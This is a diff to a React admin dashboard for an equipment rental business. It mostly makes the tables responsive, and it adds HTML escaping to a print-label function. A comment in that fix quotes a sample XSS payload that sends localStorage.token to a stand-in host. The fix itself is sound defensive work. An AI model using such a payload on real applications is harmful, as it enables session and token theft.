@@ -1473,18 +1473,23 @@ function Resumen({ equipos, rentas, unidades, ventas, me, go, metrics, adeudos, 
             <div className="text-base font-extrabold text-ink">Movimientos recientes</div>
             <div className="text-[13px] text-mute mt-1">Últimas rentas y ventas registradas</div>
           </div>
-          <div className="grid grid-cols-[1.6fr_1fr_1.1fr] px-5 py-2.5 text-[11.5px] font-bold tracking-wide text-mute border-b border-edge">
-            <div>EQUIPO</div><div>ESTADO</div><div>ACTUALIZADO</div>
+          {/* En celular la columna "actualizado" no cabe como columna: la fecha
+              se baja debajo del nombre del equipo y quedan solo dos columnas. */}
+          <div className="grid grid-cols-[1.6fr_auto] sm:grid-cols-[1.6fr_1fr_1.1fr] gap-2 px-4 sm:px-5 py-2.5 text-[11.5px] font-bold tracking-wide text-mute border-b border-edge">
+            <div>EQUIPO</div><div>ESTADO</div><div className="hidden sm:block">ACTUALIZADO</div>
           </div>
           {moves.length === 0 && <div className="px-5 py-8 text-center text-mute text-sm">Sin movimientos aún.</div>}
           {moves.map((m, i) => (
-            <div key={i} className="grid grid-cols-[1.6fr_1fr_1.1fr] items-center px-5 py-3.5 border-b border-edge hover:bg-surface-2">
+            <div key={i} className="grid grid-cols-[1.6fr_auto] sm:grid-cols-[1.6fr_1fr_1.1fr] gap-2 items-center px-4 sm:px-5 py-3.5 border-b border-edge hover:bg-surface-2">
               <div className="flex items-center gap-2.5 font-bold text-sm text-ink min-w-0">
                 <div className="w-[30px] h-[30px] rounded-lg bg-surface-2 shrink-0" />
-                <span className="truncate">{m.name} <span className="font-mono text-[11px] text-mute font-normal">{m.code}</span></span>
+                <div className="min-w-0">
+                  <span className="block truncate">{m.name} <span className="font-mono text-[11px] text-mute font-normal">{m.code}</span></span>
+                  <span className="sm:hidden block text-[11px] text-mute font-mono font-normal">{(m.ts || '').slice(0, 10) || '—'}</span>
+                </div>
               </div>
               <div><span className="text-xs font-bold px-2 py-1 rounded-md whitespace-nowrap" style={{ color: m.color, background: m.bg }}>{m.status}</span></div>
-              <div className="text-[13px] text-mute font-mono">{(m.ts || '').slice(0, 10) || '—'}</div>
+              <div className="hidden sm:block text-[13px] text-mute font-mono">{(m.ts || '').slice(0, 10) || '—'}</div>
             </div>
           ))}
         </div>
@@ -1782,7 +1787,7 @@ function EquiposAdmin({ equipos, categorias, tipos, marcas, reload, notify }: {
 
         {/* Tabla */}
         <div className="overflow-x-auto">
-          <table className="w-full min-w-[760px] text-left">
+          <table className="tabla-panel w-full min-w-[760px] text-left">
             <thead>
               <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                 <th className="font-semibold px-5 py-3">Producto</th>
@@ -1813,7 +1818,7 @@ function EquiposAdmin({ equipos, categorias, tipos, marcas, reload, notify }: {
                       </div>
                     </td>
                     {/* Clasificación: clic para asignarla ahí mismo, sin abrir el formulario */}
-                    <td className="px-3 py-3">
+                    <td data-col="Clasificación" className="px-3 py-3">
                       {(e.categoria || e.tipo || e.marca) ? (
                         <button onClick={() => clasificarEquipo(e)} className="text-left group/cl" title="Cambiar clasificación">
                           <p className="text-xs text-ink group-hover/cl:text-gold transition-colors">{e.categoria?.nombre || '—'}</p>
@@ -1826,7 +1831,7 @@ function EquiposAdmin({ equipos, categorias, tipos, marcas, reload, notify }: {
                       )}
                     </td>
                     {/* Condición */}
-                    <td className="px-3 py-3">
+                    <td data-col="Condición" className="px-3 py-3">
                       <div className="flex flex-wrap gap-1">
                         {(e.condiciones || []).includes('nueva') && <span className="text-[9px] px-1.5 py-0.5 rounded bg-emerald-500/10 text-emerald-500 font-bold uppercase">Nuevo</span>}
                         {(e.condiciones || []).includes('seminueva') && <span className="text-[9px] px-1.5 py-0.5 rounded bg-blue-500/10 text-blue-500 font-bold uppercase">Semin.</span>}
@@ -1834,18 +1839,20 @@ function EquiposAdmin({ equipos, categorias, tipos, marcas, reload, notify }: {
                       </div>
                     </td>
                     {/* Precio día */}
-                    <td className="px-3 py-3 text-right whitespace-nowrap">
+                    <td data-col="Precio/día" className="px-3 py-3 text-right whitespace-nowrap">
                       <span className="text-sm font-semibold text-price">${num(e.precio_dia).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
                     </td>
                     {/* Venta */}
-                    <td className="px-3 py-3 text-right whitespace-nowrap">
+                    <td data-col="Venta" className="px-3 py-3 text-right whitespace-nowrap">
                       <span className="text-sm text-ink">{num(e.precio_venta) ? `$${num(e.precio_venta).toLocaleString('en-US', { minimumFractionDigits: 2 })}` : '—'}</span>
                     </td>
                     {/* Unidades (cada máquina es una pieza única, no stock fungible) */}
-                    <td className="px-3 py-3 text-center whitespace-nowrap">
-                      <span className="text-sm font-bold text-ink">{total}</span>
-                      <span className="text-[11px] text-mute"> und.</span>
-                      <p className={`text-[10px] font-semibold ${disp > 0 ? 'text-emerald-500' : 'text-mute'}`}>{disp} disp.</p>
+                    <td data-col="Unidades" className="px-3 py-3 text-center whitespace-nowrap">
+                      <div>
+                        <span className="text-sm font-bold text-ink">{total}</span>
+                        <span className="text-[11px] text-mute"> und.</span>
+                        <p className={`text-[10px] font-semibold ${disp > 0 ? 'text-emerald-500' : 'text-mute'}`}>{disp} disp.</p>
+                      </div>
                     </td>
                     {/* Acciones */}
                     <td className="px-5 py-3">
@@ -2289,14 +2296,16 @@ function InventoryModal({ equipo, onClose, notify }: {
         {/* Zona desplazable: al subir, los KPIs y "Agregar unidad" salen y se ven más unidades */}
         <div className="flex-1 overflow-y-auto min-h-0">
         {/* KPIs por unidad */}
-        <div className="grid grid-cols-4 border-y border-edge divide-x divide-edge">
+        {/* `gap-px` sobre el color del borde: las divisiones se ven igual de
+            limpias con 2 columnas (celular) que con 4 (escritorio). */}
+        <div className="grid grid-cols-2 sm:grid-cols-4 gap-px bg-edge border-y border-edge">
           {([
             ['Unidades totales', unidades.length, 'text-ink'],
             ['Disponibles', counts.disponible, 'text-emerald-500'],
             ['Rentadas', counts.rentado, 'text-blue-500'],
             ['Vendidas', counts.vendido, 'text-mute'],
           ] as const).map(([lbl, n, cls]) => (
-            <div key={lbl} className="px-4 sm:px-6 py-4">
+            <div key={lbl} className="bg-surface px-4 sm:px-6 py-4">
               <p className={`text-[24px] sm:text-[26px] font-black leading-none ${cls}`}>{n}</p>
               <p className="text-[11px] sm:text-[12px] text-mute mt-1.5 leading-tight">{lbl}</p>
             </div>
@@ -3042,7 +3051,7 @@ function InventarioGlobal({ unidades, equipos, reload, notify, onEnviarTaller }:
 
         {/* Tabla */}
         <div className="overflow-x-auto">
-          <table className="w-full min-w-[820px] text-left">
+          <table className="tabla-panel w-full min-w-[820px] text-left">
             <thead>
               <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                 <th className="font-semibold px-5 py-3">Etiqueta / Código</th>
@@ -3062,7 +3071,7 @@ function InventarioGlobal({ unidades, equipos, reload, notify, onEnviarTaller }:
                     {u.numero_serie && <p className="text-[11px] text-mute">Serie {u.numero_serie}</p>}
                   </td>
                   {/* Producto */}
-                  <td className="px-3 py-3">
+                  <td data-col="Producto" className="px-3 py-3">
                     <div className="flex items-center gap-2.5 min-w-0">
                       <div className="w-9 h-9 rounded-lg bg-surface-2 overflow-hidden shrink-0">
                         {u.equipo_info?.imagen && <img src={resolveMediaUrl(u.equipo_info.imagen)} alt="" className="w-full h-full object-cover" />}
@@ -3071,20 +3080,22 @@ function InventarioGlobal({ unidades, equipos, reload, notify, onEnviarTaller }:
                     </div>
                   </td>
                   {/* Condición */}
-                  <td className="px-3 py-3">
+                  <td data-col="Condición" className="px-3 py-3">
                     {pillCond(u.condicion)}
                   </td>
                   {/* Estado */}
-                  <td className="px-3 py-3">
-                    {pillEstado(u.estado)}
-                    {u.estado === 'rentado' && u.renta_activa && (
-                      <p className={`text-[11px] mt-1 ${u.renta_activa.vencida ? 'text-red-500 font-semibold' : 'text-mute'}`}>
-                        {u.renta_activa.vencida ? '⚠ Vencida' : `${u.renta_activa.dias_restantes}d restantes`}
-                      </p>
-                    )}
+                  <td data-col="Estado" className="px-3 py-3">
+                    <div>
+                      {pillEstado(u.estado)}
+                      {u.estado === 'rentado' && u.renta_activa && (
+                        <p className={`text-[11px] mt-1 ${u.renta_activa.vencida ? 'text-red-500 font-semibold' : 'text-mute'}`}>
+                          {u.renta_activa.vencida ? '⚠ Vencida' : `${u.renta_activa.dias_restantes}d restantes`}
+                        </p>
+                      )}
+                    </div>
                   </td>
                   {/* Ubicación / Cliente */}
-                  <td className="px-3 py-3 max-w-[220px]">
+                  <td data-col="Ubicación" className="px-3 py-3 max-w-[220px]">
                     {u.estado === 'rentado' && u.renta_activa ? (
                       <p className="text-xs text-mute truncate">{u.renta_activa.cliente || 'Cliente'} · {u.renta_activa.direccion}</p>
                     ) : (
@@ -3093,7 +3104,7 @@ function InventarioGlobal({ unidades, equipos, reload, notify, onEnviarTaller }:
                   </td>
                   {/* Acciones */}
                   <td className="px-5 py-3">
-                    <div className="flex items-center justify-end gap-1.5">
+                    <div className="flex flex-wrap items-center justify-end gap-1.5">
                       <button onClick={() => setLabelUnit(u)} title="Etiqueta / Imprimir" className="w-8 h-8 rounded-lg border border-edge text-mute hover:text-gold hover:border-gold/40 transition-colors flex items-center justify-center">
                         <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8"><path strokeLinecap="round" strokeLinejoin="round" d="M6 9V2h12v7M6 18H4a2 2 0 01-2-2v-5a2 2 0 012-2h16a2 2 0 012 2v5a2 2 0 01-2 2h-2M6 14h12v8H6z" /></svg>
                       </button>
@@ -3205,7 +3216,13 @@ function LabelModal({ unit, onClose }: { unit: Unidad; onClose: () => void }) {
   function imprimir() {
     const w = window.open('', '_blank', 'width=480,height=320')
     if (!w) return
-    w.document.write(`<!doctype html><html><head><title>${unit.codigo}</title>
+    // Escapamos TODO lo interpolado: numero_serie y modelo son texto libre que
+    // captura el personal. Sin escapar, un "N° de serie" como
+    // <img src=x onerror="fetch('https://malo/?t='+localStorage.token)"> se
+    // ejecutaría en el ORIGEN de la app al imprimir → robo de sesión/token.
+    const esc = (s: unknown) => String(s ?? '').replace(/[&<>"']/g, c =>
+      ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' } as Record<string, string>)[c])
+    w.document.write(`<!doctype html><html><head><title>${esc(unit.codigo)}</title>
       <style>
         @page { size: 70mm 40mm; margin: 0; }
         * { box-sizing: border-box; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
@@ -3222,11 +3239,11 @@ function LabelModal({ unit, onClose }: { unit: Unidad; onClose: () => void }) {
         <div class="lbl">
           <div class="info">
             <div class="brand">REMALI</div>
-            <div class="model">${modelo}</div>
-            <div class="code">${unit.codigo}</div>
-            <div class="cond">${unit.condicion}${unit.numero_serie ? ' · ' + unit.numero_serie : ''}</div>
+            <div class="model">${esc(modelo)}</div>
+            <div class="code">${esc(unit.codigo)}</div>
+            <div class="cond">${esc(unit.condicion)}${unit.numero_serie ? ' · ' + esc(unit.numero_serie) : ''}</div>
           </div>
-          <img src="${qr}" alt="QR" />
+          <img src="${esc(qr)}" alt="QR" />
         </div>
       </body></html>`)
     w.document.close()
@@ -3344,7 +3361,7 @@ function RentasAdmin({ reload, notify }: { reload: () => void; notify: (m: strin
 
         {/* Tabla */}
         <div className="overflow-x-auto">
-          <table className="w-full min-w-[820px] text-left">
+          <table className="tabla-panel w-full min-w-[820px] text-left">
             <thead>
               <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                 <th className="font-semibold px-5 py-3">Equipo</th>
@@ -3362,20 +3379,22 @@ function RentasAdmin({ reload, notify }: { reload: () => void; notify: (m: strin
                     <p className="text-sm font-semibold text-ink truncate">{r.inventario.equipo}</p>
                     <p className="font-mono text-[11px] text-mute">{r.inventario.codigo}</p>
                   </td>
-                  <td className="px-3 py-3 max-w-[220px]">
+                  <td data-col="Cliente" className="px-3 py-3 max-w-[220px]">
                     <p className="text-sm text-ink truncate">
                       {r.obra
                         ? (r.obra.responsable || r.cliente || r.empresa?.nombre || 'Encargado')
                         : (r.cliente || r.empresa?.nombre || r.cliente_nombre || 'Cliente')}
                     </p>
                   </td>
-                  <td className="px-3 py-3 max-w-[200px]"><p className="text-xs text-mute truncate">{r.direccion}</p></td>
-                  <td className="px-3 py-3 whitespace-nowrap">
-                    <p className="text-xs text-ink capitalize">{r.modalidad}</p>
-                    <p className="text-[11px] text-mute font-mono">{r.fecha_inicio || ''} → {r.fecha_fin}</p>
-                    {r.total && <p className="text-[11px] text-price font-semibold">${Number(r.total).toLocaleString('en-US', { minimumFractionDigits: 2 })}</p>}
+                  <td data-col="Ubicación" className="px-3 py-3 max-w-[200px]"><p className="text-xs text-mute truncate">{r.direccion}</p></td>
+                  <td data-col="Periodo" className="px-3 py-3 whitespace-nowrap">
+                    <div>
+                      <p className="text-xs text-ink capitalize">{r.modalidad}</p>
+                      <p className="text-[11px] text-mute font-mono">{r.fecha_inicio || ''} → {r.fecha_fin}</p>
+                      {r.total && <p className="text-[11px] text-price font-semibold">${Number(r.total).toLocaleString('en-US', { minimumFractionDigits: 2 })}</p>}
+                    </div>
                   </td>
-                  <td className="px-3 py-3 whitespace-nowrap">
+                  <td data-col="Vencimiento" className="px-3 py-3 whitespace-nowrap">
                     {estado === 'activa' ? (
                       <span className={`text-xs font-bold ${r.vencida ? 'text-red-500' : (r.dias_restantes ?? 9) <= 2 ? 'text-amber-500' : 'text-mute'}`}>
                         {r.vencida ? '⚠ Vencida' : `${r.dias_restantes}d restantes`}
@@ -3387,7 +3406,7 @@ function RentasAdmin({ reload, notify }: { reload: () => void; notify: (m: strin
                     )}
                   </td>
                   <td className="px-5 py-3 text-right">
-                    <div className="flex items-center justify-end gap-2">
+                    <div className="flex flex-wrap items-center justify-end gap-2">
                       <button onClick={() => setVerRenta(r)} title="Ver detalle de la renta" className="inline-flex items-center gap-1.5 px-2.5 h-8 rounded-lg border border-edge text-mute text-xs font-semibold hover:text-ink hover:border-ink/30 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ink/20 transition-colors">
                         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
                         Ver
@@ -4015,7 +4034,7 @@ function VentasAdmin({ notify }: { notify: (m: string, t?: 'ok' | 'err') => void
 
         {/* Tabla */}
         <div className="overflow-x-auto">
-          <table className="w-full min-w-[760px] text-left">
+          <table className="tabla-panel w-full min-w-[760px] text-left">
             <thead>
               <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                 <th className="font-semibold px-5 py-3">Cliente</th>
@@ -4044,20 +4063,22 @@ function VentasAdmin({ notify }: { notify: (m: string, t?: 'ok' | 'err') => void
                       </div>
                     </div>
                   </td>
-                  <td className="px-3 py-3">
-                    {v.unidad ? (
-                      <><p className="text-sm text-ink truncate">{v.unidad.equipo}</p><p className="font-mono text-[11px] text-mute">{v.unidad.codigo}</p></>
-                    ) : v.origen ? (
-                      <><p className="text-sm text-ink truncate">{v.origen.resumen || 'Venta desde cotización'}</p><p className="font-mono text-[11px] text-mute">{v.origen.folio} · sin unidad asignada</p></>
-                    ) : <span className="text-xs text-mute">—</span>}
+                  <td data-col="Equipo" className="px-3 py-3">
+                    <div>
+                      {v.unidad ? (
+                        <><p className="text-sm text-ink truncate">{v.unidad.equipo}</p><p className="font-mono text-[11px] text-mute">{v.unidad.codigo}</p></>
+                      ) : v.origen ? (
+                        <><p className="text-sm text-ink truncate">{v.origen.resumen || 'Venta desde cotización'}</p><p className="font-mono text-[11px] text-mute">{v.origen.folio} · sin unidad asignada</p></>
+                      ) : <span className="text-xs text-mute">—</span>}
+                    </div>
                   </td>
-                  <td className="px-3 py-3 whitespace-nowrap text-xs text-mute">{new Date(v.fecha).toLocaleDateString('es-MX', { day: '2-digit', month: 'short', year: 'numeric' })}</td>
-                  <td className="px-3 py-3">
+                  <td data-col="Fecha" className="px-3 py-3 whitespace-nowrap text-xs text-mute"><span>{new Date(v.fecha).toLocaleDateString('es-MX', { day: '2-digit', month: 'short', year: 'numeric' })}</span></td>
+                  <td data-col="Pago" className="px-3 py-3">
                     <span className={`text-[10px] px-2 py-0.5 rounded-md font-semibold uppercase ${metodoStyle[v.metodo_pago] || 'bg-surface-2 text-mute'}`}>{v.metodo_pago}</span>
                   </td>
-                  <td className="px-3 py-3 text-xs text-mute">{v.vendedor || '—'}</td>
+                  <td data-col="Vendedor" className="px-3 py-3 text-xs text-mute"><span>{v.vendedor || '—'}</span></td>
                   <td className="px-5 py-3 text-right whitespace-nowrap">
-                    <div className="flex items-center justify-end gap-2">
+                    <div className="flex flex-wrap items-center justify-end gap-2">
                       <div className="text-right">
                         <span className={`text-sm font-black ${v.estado === 'cancelada' ? 'text-mute line-through' : 'text-price'}`}>${(Number(v.total) || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
                         {v.iva && <p className="text-[10px] text-mute">IVA ${Number(v.iva).toLocaleString('en-US', { minimumFractionDigits: 2 })}</p>}
@@ -4743,7 +4764,7 @@ function EmpresasAdmin({ empresas, reload, notify }: {
 
         {/* Tabla */}
         <div className="overflow-x-auto">
-          <table className="w-full min-w-[720px] text-left">
+          <table className="tabla-panel w-full min-w-[720px] text-left">
             <thead>
               <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                 <th className="font-semibold px-5 py-3">Empresa</th>
@@ -4767,18 +4788,20 @@ function EmpresasAdmin({ empresas, reload, notify }: {
                       </div>
                     </div>
                   </td>
-                  <td className="px-3 py-3">
-                    {e.contacto && <p className="text-sm text-ink truncate">{e.contacto}</p>}
-                    <p className="text-[11px] text-mute truncate">{[e.telefono, e.email].filter(Boolean).join(' · ') || '—'}</p>
+                  <td data-col="Contacto" className="px-3 py-3">
+                    <div>
+                      {e.contacto && <p className="text-sm text-ink truncate">{e.contacto}</p>}
+                      <p className="text-[11px] text-mute truncate">{[e.telefono, e.email].filter(Boolean).join(' · ') || '—'}</p>
+                    </div>
                   </td>
-                  <td className="px-3 py-3">
+                  <td data-col="Obras" className="px-3 py-3">
                     <button onClick={() => setObrasEmpresa(e)} className="inline-flex items-center gap-1.5 text-sm text-ink hover:text-gold transition-colors">
                       <span className="min-w-6 h-6 px-2 rounded-md bg-surface-2 text-mute text-xs font-bold flex items-center justify-center">{e.obras_count ?? (e.obras?.length || 0)}</span>
                       obras
                     </button>
                   </td>
                   <td className="px-5 py-3">
-                    <div className="flex items-center justify-end gap-1.5">
+                    <div className="flex flex-wrap items-center justify-end gap-1.5">
                       <button onClick={() => setObrasEmpresa(e)} className="px-3 h-8 rounded-lg bg-gold-soft text-gold text-xs font-semibold hover:bg-gold/20 transition-colors">Obras</button>
                       <button onClick={() => openEdit(e)} title="Editar" className="w-8 h-8 rounded-lg border border-edge text-mute hover:text-ink hover:border-gold/40 transition-colors flex items-center justify-center">
                         <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.8"><path strokeLinecap="round" strokeLinejoin="round" d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7M18.5 2.5a2.12 2.12 0 013 3L12 15l-4 1 1-4 9.5-9.5z" /></svg>
@@ -5202,14 +5225,13 @@ function RefaccionesAdmin({ refacciones, reload, notify }: {
         </div>
 
         <div className="overflow-x-auto">
-          <table className="w-full min-w-[760px] text-left">
+          <table className="tabla-panel w-full min-w-[760px] text-left">
             <thead>
               <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                 <th className="font-semibold px-5 py-3">Refacción</th>
                 <th className="font-semibold px-3 py-3">Código de barras</th>
                 <th className="font-semibold px-3 py-3">Precio</th>
                 <th className="font-semibold px-3 py-3">Stock</th>
-                <th className="font-semibold px-3 py-3">Uso</th>
                 <th className="font-semibold px-5 py-3 text-right">Acciones</th>
               </tr>
             </thead>
@@ -5220,19 +5242,16 @@ function RefaccionesAdmin({ refacciones, reload, notify }: {
                     <p className="text-sm font-semibold text-ink">{r.nombre}</p>
                     {r.ubicacion && <p className="text-[11px] text-mute">{r.ubicacion}</p>}
                   </td>
-                  <td className="px-3 py-3 font-mono text-[13px] text-mute whitespace-nowrap">{r.codigo_barras}</td>
-                  <td className="px-3 py-3 text-sm font-bold text-price whitespace-nowrap">${num(r.precio_venta).toLocaleString('en-US', { minimumFractionDigits: 2 })}</td>
-                  <td className="px-3 py-3 whitespace-nowrap">
-                    <span className={`text-sm font-bold ${r.bajo_stock ? 'text-red-500' : 'text-ink'}`}>{r.stock}</span>
-                    {r.bajo_stock && <span className="ml-2 text-[10px] font-bold uppercase text-red-500 bg-red-500/10 px-1.5 py-0.5 rounded">Bajo</span>}
-                  </td>
-                  <td className="px-3 py-3">
-                    {r.para_venta
-                      ? <span className="text-[11px] font-bold px-2 py-0.5 rounded bg-gold-soft text-gold whitespace-nowrap">Venta + Mant.</span>
-                      : <span className="text-[11px] font-bold px-2 py-0.5 rounded bg-surface-2 text-mute whitespace-nowrap">Mantenimiento</span>}
+                  <td data-col="Código" className="px-3 py-3 font-mono text-[13px] text-mute whitespace-nowrap"><span>{r.codigo_barras}</span></td>
+                  <td data-col="Precio" className="px-3 py-3 text-sm font-bold text-price whitespace-nowrap"><span>${num(r.precio_venta).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span></td>
+                  <td data-col="Stock" className="px-3 py-3 whitespace-nowrap">
+                    <div>
+                      <span className={`text-sm font-bold ${r.bajo_stock ? 'text-red-500' : 'text-ink'}`}>{r.stock}</span>
+                      {r.bajo_stock && <span className="ml-2 text-[10px] font-bold uppercase text-red-500 bg-red-500/10 px-1.5 py-0.5 rounded">Bajo</span>}
+                    </div>
                   </td>
                   <td className="px-5 py-3 text-right">
-                    <div className="flex items-center justify-end gap-2">
+                    <div className="flex flex-wrap items-center justify-end gap-2">
                       <button onClick={() => (r.stock > 0 ? setSellRef(r) : notify('Sin stock', 'err'))} title="Vender al público" className="h-8 px-3 rounded-lg border border-emerald-500/30 text-emerald-500 text-xs font-semibold hover:bg-emerald-500/10 transition-colors flex items-center gap-1.5">
                         <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.7"><rect x="3" y="7" width="18" height="10" rx="2" /><circle cx="12" cy="12" r="2.2" /></svg>
                         Vender
@@ -5389,7 +5408,7 @@ function ReparacionesAdmin({ ordenes, refacciones, unidades, empresas, reload, n
         </div>
 
         <div className="overflow-x-auto">
-          <table className="w-full min-w-[820px] text-left">
+          <table className="tabla-panel w-full min-w-[820px] text-left">
             <thead>
               <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                 <th className="font-semibold px-5 py-3">Folio</th>
@@ -5407,20 +5426,22 @@ function ReparacionesAdmin({ ordenes, refacciones, unidades, empresas, reload, n
                 return (
                   <tr key={o.id} className="hover:bg-surface-2 transition-colors cursor-pointer" onClick={() => setDetalle(o)}>
                     <td className="px-5 py-3 font-mono text-[13px] font-bold text-ink whitespace-nowrap">{o.folio}</td>
-                    <td className="px-3 py-3">
-                      {o.tipo === 'interna'
-                        ? <p className="text-sm font-medium text-mute italic">Máquina propia</p>
-                        : <>
-                          <p className="text-sm font-semibold text-ink">{o.cliente_display}</p>
-                          {o.cliente_telefono && <p className="text-[11px] text-mute">{o.cliente_telefono}</p>}
-                        </>}
+                    <td data-col="Cliente" className="px-3 py-3">
+                      <div>
+                        {o.tipo === 'interna'
+                          ? <p className="text-sm font-medium text-mute italic">Máquina propia</p>
+                          : <>
+                            <p className="text-sm font-semibold text-ink">{o.cliente_display}</p>
+                            {o.cliente_telefono && <p className="text-[11px] text-mute">{o.cliente_telefono}</p>}
+                          </>}
+                      </div>
                     </td>
-                    <td className="px-3 py-3 text-sm text-ink max-w-[220px] truncate">{o.equipo_display}</td>
-                    <td className="px-3 py-3"><span className={`inline-flex items-center gap-1.5 text-[11px] font-bold px-2 py-0.5 rounded-full ${m.cls}`}><span className="w-1.5 h-1.5 rounded-full" style={{ background: m.dot }} />{orLabel(o.estado, o.tipo)}</span></td>
-                    <td className="px-3 py-3 text-sm font-bold text-price text-right whitespace-nowrap">{orMoney(o.total)}</td>
-                    <td className="px-3 py-3 text-[13px] text-mute whitespace-nowrap">{fechaCorta(o.fecha_recibida)}</td>
+                    <td data-col="Equipo" className="px-3 py-3 text-sm text-ink max-w-[220px] truncate"><span>{o.equipo_display}</span></td>
+                    <td data-col="Estado" className="px-3 py-3"><span className={`inline-flex items-center gap-1.5 text-[11px] font-bold px-2 py-0.5 rounded-full ${m.cls}`}><span className="w-1.5 h-1.5 rounded-full" style={{ background: m.dot }} />{orLabel(o.estado, o.tipo)}</span></td>
+                    <td data-col="Total" className="px-3 py-3 text-sm font-bold text-price text-right whitespace-nowrap"><span>{orMoney(o.total)}</span></td>
+                    <td data-col="Recibida" className="px-3 py-3 text-[13px] text-mute whitespace-nowrap"><span>{fechaCorta(o.fecha_recibida)}</span></td>
                     <td className="px-5 py-3 text-right" onClick={e => e.stopPropagation()}>
-                      <div className="flex items-center justify-end gap-2">
+                      <div className="flex flex-wrap items-center justify-end gap-2">
                         <button onClick={() => setDetalle(o)} className="h-8 px-3 rounded-lg border border-edge text-mute text-xs font-semibold hover:text-ink hover:border-gold/40 transition-colors">Abrir</button>
                         <button onClick={() => setCarta(o)} title="Imprimir orden (Carta)" className="w-8 h-8 rounded-lg border border-edge text-mute hover:text-gold hover:border-gold/40 transition-colors flex items-center justify-center">
                           <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.7"><path d="M6 9V4h12v5M6 18H4v-6a2 2 0 012-2h12a2 2 0 012 2v6h-2M8 14h8v6H8z" /></svg>
@@ -6568,7 +6589,7 @@ function FacturacionAdmin({ solicitudes, reload, notify }: {
         </div>
 
         <div className="overflow-x-auto">
-          <table className="w-full min-w-[820px] text-left">
+          <table className="tabla-panel w-full min-w-[820px] text-left">
             <thead>
               <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                 <th className="font-semibold px-5 py-3">Origen</th>
@@ -6591,15 +6612,19 @@ function FacturacionAdmin({ solicitudes, reload, notify }: {
                       </div>
                       <p className="text-[11px] text-mute truncate max-w-[200px]">{s.concepto}</p>
                     </td>
-                    <td className="px-3 py-3">
-                      <p className="text-sm font-semibold text-ink truncate max-w-[200px]">{s.cliente_display}</p>
-                      <p className="text-[11px] text-mute font-mono">{s.rfc || '—'}</p>
+                    <td data-col="Cliente" className="px-3 py-3">
+                      <div>
+                        <p className="text-sm font-semibold text-ink truncate max-w-[200px]">{s.cliente_display}</p>
+                        <p className="text-[11px] text-mute font-mono">{s.rfc || '—'}</p>
+                      </div>
                     </td>
-                    <td className="px-3 py-3 text-sm font-bold text-price text-right whitespace-nowrap">{orMoney(s.total)}</td>
-                    <td className="px-3 py-3 text-[13px] text-mute whitespace-nowrap">{fechaCorta(s.fecha_origen)}</td>
-                    <td className="px-3 py-3">
-                      <span className={`inline-flex items-center gap-1.5 text-[11px] font-bold px-2 py-0.5 rounded-full ${m.cls}`}><span className="w-1.5 h-1.5 rounded-full" style={{ background: m.dot }} />{m.label}</span>
-                      {s.estado === 'pendiente' && !s.datos_completos && <p className="text-[10px] text-red-500 mt-1">Datos incompletos</p>}
+                    <td data-col="Total" className="px-3 py-3 text-sm font-bold text-price text-right whitespace-nowrap"><span>{orMoney(s.total)}</span></td>
+                    <td data-col="Fecha" className="px-3 py-3 text-[13px] text-mute whitespace-nowrap"><span>{fechaCorta(s.fecha_origen)}</span></td>
+                    <td data-col="Estado" className="px-3 py-3">
+                      <div>
+                        <span className={`inline-flex items-center gap-1.5 text-[11px] font-bold px-2 py-0.5 rounded-full ${m.cls}`}><span className="w-1.5 h-1.5 rounded-full" style={{ background: m.dot }} />{m.label}</span>
+                        {s.estado === 'pendiente' && !s.datos_completos && <p className="text-[10px] text-red-500 mt-1">Datos incompletos</p>}
+                      </div>
                     </td>
                     <td className="px-5 py-3 text-right" onClick={e => e.stopPropagation()}>
                       <button onClick={() => setDetalle(s)} className="h-8 px-3 rounded-lg border border-edge text-mute text-xs font-semibold hover:text-ink hover:border-gold/40 transition-colors">
@@ -6879,7 +6904,7 @@ function CotizacionesAdmin({ empresas, notify, irAInventario }: {
         </div>
 
         <div className="overflow-x-auto">
-          <table className="w-full min-w-[820px] text-left">
+          <table className="tabla-panel w-full min-w-[820px] text-left">
             <thead>
               <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                 <th className="font-semibold px-5 py-3">Folio</th>
@@ -6897,24 +6922,26 @@ function CotizacionesAdmin({ empresas, notify, irAInventario }: {
                 return (
                   <tr key={c.id} className="hover:bg-surface-2 transition-colors cursor-pointer" onClick={() => setDetalle(c)}>
                     <td className="px-5 py-3 font-mono text-[13px] font-bold text-ink whitespace-nowrap">{c.folio || <span className="text-mute font-sans font-semibold">Borrador</span>}</td>
-                    <td className="px-3 py-3">
-                      <div className="flex items-center gap-2">
-                        <p className="text-sm font-semibold text-ink">{c.cliente_display}</p>
-                        {c.origen === 'cliente' && <span className="text-[9px] font-bold uppercase px-1.5 py-0.5 rounded bg-blue-500/10 text-blue-600">Cliente</span>}
+                    <td data-col="Cliente" className="px-3 py-3">
+                      <div>
+                        <div className="flex items-center gap-2">
+                          <p className="text-sm font-semibold text-ink">{c.cliente_display}</p>
+                          {c.origen === 'cliente' && <span className="text-[9px] font-bold uppercase px-1.5 py-0.5 rounded bg-blue-500/10 text-blue-600">Cliente</span>}
+                        </div>
